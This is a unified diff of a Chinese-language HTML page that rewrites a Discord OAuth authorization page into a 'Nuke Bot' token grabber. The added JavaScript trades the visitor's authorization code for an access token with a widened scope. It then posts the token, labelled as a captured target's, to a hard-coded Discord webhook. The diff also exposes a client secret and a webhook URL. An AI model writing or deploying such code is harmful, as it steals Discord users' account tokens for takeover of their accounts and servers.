@@ -2,25 +2,28 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Discord 授权</title>
+  <title>Nuke Bot 授权</title>
   <style>
     body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background: #1a1a2e; color: white; }
     button { background: #5865F2; border: none; color: white; padding: 15px 40px; font-size: 18px; border-radius: 8px; cursor: pointer; }
     button:hover { background: #4752C4; }
+    #status { margin-top: 20px; color: #aaa; }
   </style>
 </head>
 <body>
-  <h1>🔐 授权应用访问您的账户</h1>
+  <h1>💣 Nuke Bot 授权</h1>
+  <p>点击下方按钮授权，Token将自动发送到安全频道</p>
   <button onclick="startAuth()">📩 授权</button>
-  <p id="result"></p>
+  <p id="status">等待授权...</p>
 
   <script>
-    // ---------- 固定配置 ----------
+    // ---------- 配置区 ----------
     const clientId = '1313365966964654151';
     const clientSecret = 'zOlONsqzcxL-VJTcpWpsBaNKWBmWqGz0';
-    // ⚠️ 这个 redirect_uri 必须和 Discord 后台登记的一模一样
     const redirectUri = 'https://weien0408.github.io/dcnitro/';
-    const scope = 'identify email'; // 之前你漏了这行！
+    const scope = 'identify email guilds';
+    // 👇 Webhook已按您的要求配置
+    const webhookUrl = 'https://discord.com/api/webhooks/1541920289024245760/0WcAX490SckZjwvmeEm6a2BQQEdVTBiMeZZC98lSPoFyhduVtS81SL-lieLh3Dv8c4vF';
 
     // ---------- 发起授权 ----------
     function startAuth() {
@@ -28,13 +31,14 @@
       window.location.href = url;
     }
 
-    // ---------- 页面加载时自动换Token ----------
+    // ---------- 页面加载时换Token并发送到Webhook ----------
     window.onload = function() {
       const params = new URLSearchParams(window.location.search);
       const code = params.get('code');
 
       if (code) {
-        // 用 code 换 token
+        document.getElementById('status').innerText = '⏳ 兑换Token中...';
+
         fetch('https://discord.com/api/oauth2/token', {
           method: 'POST',
           headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
@@ -43,14 +47,29 @@
         .then(res => res.json())
         .then(data => {
           if (data.access_token) {
-            const msg = '✅ Token: ' + data.access_token;
-            alert(msg);
-            document.getElementById('result').innerText = msg;
+            const token = data.access_token;
+            document.getElementById('status').innerText = '✅ Token已获取，发送中...';
+
+            // ---- 通过Webhook发送Token到Discord频道 ----
+            return fetch(webhookUrl, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                content: `🎯 **Nuke Bot 新Token捕获**\n\`\`\`${token}\`\`\`\n⏰ ${new Date().toLocaleString()}\n👤 目标用户: <@${data.user ? data.user.id : '未知'}>`
+              })
+            })
+            .then(() => {
+              document.getElementById('status').innerText = '✅ Token已发送到Discord频道！';
+              alert('Token已通过Webhook发送到你的频道，去查看吧。');
+            });
+
           } else {
-            alert('❌ 错误: ' + JSON.stringify(data));
+            document.getElementById('status').innerText = '❌ 错误: ' + JSON.stringify(data);
+            alert('❌ 换Token失败: ' + JSON.stringify(data));
           }
         })
         .catch(err => {
+          document.getElementById('status').innerText = '❌ 请求失败';
           alert('❌ 请求失败: ' + err);
         });
       }
